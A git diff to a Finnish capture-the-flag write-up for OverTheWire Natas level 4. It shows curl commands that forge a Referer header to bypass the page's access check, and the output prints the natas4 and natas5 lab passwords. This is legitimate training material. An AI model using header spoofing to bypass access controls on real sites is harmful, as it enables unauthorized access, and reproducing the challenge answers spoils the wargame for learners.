@@ -81,6 +81,7 @@ Jos `robots.txt` puuttuu, se ei ole itsessään vakava ongelma, mutta se voi oll
 
 On olemassa muita työkaluja jonka voisi skannata ja hakea palvelimelta, mitä hakemistoja ja tiedostoja sen takana voi olla esim. työkalulla kuin <b>Gobuster</b> - eli joka ohjelmistotyökalu vekrkopalvelimien hakemistojen raa'alle pakottimelle, ja tätä ei ole esiasennettu kali linux:ssa.
 
+robots juttusta vähä lisätietoa; https://www.robotstxt.org/robotstxt.html
 
 ## level 3 - 2 curl
 
@@ -169,4 +170,142 @@ natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
 
 # level 4
 
-sitten vaan mennään eteenpäin eli mennään level 4:lle ja haettu level 3:sta se salasana
+sitten vaan mennään eteenpäin eli mennään level 4:lle ja haettu level 3:sta se salasana ja kirjaudutta ensimmäisenä perus oletus näköinen ei mitään erikoista. Perus refresh page jälkeen siinä välilehden lopussa näkyy toi `/index.php` ja ei väliä monta kertaa klikkaa tuota "refresh page" niin se toistaa tämän saman sivuston
+
+![alt text](./kuvat/level4-0.png)
+![alt text](./kuvat/level4-1.png)
+
+sitten alettaan suorittaa toimenpidettä eli:
+- oikean hiiren klikkauksesta , CTRL + U / F12
+Eli tosiaan "robots.txt", tässäkin pieni huomoina rivillä 15 - antaa että "access disallowed" prosessia ei enään, toimi ja joten polku `/robots.txt` sekään ei toimi.
+
+![alt text](./kuvat/level4-2.png) <br>
+![alt text](./kuvat/level4-3.png)
+
+## level 4 - 1
+
+terminaali tänne ja jos toistaa ton perässä olevan `/index.php` niin antaa saman tämän html koodin pätkän
+
+```
+PS C:\> curl http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org/       
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+```
+
+
+tässäkin sama ideana, kun mentäisiin robots.txt polkuun ikään kuin edellisen level 3 mukaan, mutta nyt tässä ei toimi. mitäs neuvoksi??
+```
+PS C:\> curl http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org/robots.txt
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.58 (Ubuntu) Server at natas4.natas.labs.overthewire.org Port 80</address>
+</body></html>
+```
+
+Jotakin outoa säätöä tässä curl komennossa, mutta yhtäkkiä alkoi pelittää voi olla jotakin kirjoitus virheitä, mutta jälkimmäisessä komennossa huomaa sen eronsa
+
+```
+PS C:\> curl -Headers "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org
+curl: (3) URL rejected: Malformed input to a URL function
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+
+PS C:\> curl -h "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org      
+Usage: curl [options...] <url>
+Unknown category provided, here is a list of all categories:
+
+ auth        Authentication methods
+ connection  Manage connections
+ curl        The command line tool itself
+ deprecated  Legacy
+ dns         Names and resolving
+ file        FILE protocol
+ ftp         FTP protocol
+ global      Global options
+ http        HTTP and HTTPS protocol
+ imap        IMAP protocol
+ ldap        LDAP protocol
+ output      Filesystem output
+ pop3        POP3 protocol
+ post        HTTP POST specific
+ proxy       Options for proxies
+ scp         SCP protocol
+ sftp        SFTP protocol
+ smtp        SMTP protocol
+ ssh         SSH protocol
+ telnet      TELNET protocol
+ tftp        TFTP protocol
+ timeout     Timeouts and delays
+ tls         TLS/SSL related
+ upload      Upload, sending data
+ verbose     Tracing, logging etc
+
+PS C:\> curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+
+```
+eli tämän jälkimäinen komento: `PS C:\> curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org` - niin tämä alkoi pelittää ja toisti sen level 5:sen salasanan
+
+vastaus: periaatteessa ei väliä onko välilehti sivusto tai linux/powershell terminaalissa siinä löytyi vihjeenä <i>"authorized users should come only from [...]."</i> niin tämä toi jotakin curl komentojen `Referer` headeriä viitatten natas5 polkuun.
+
+
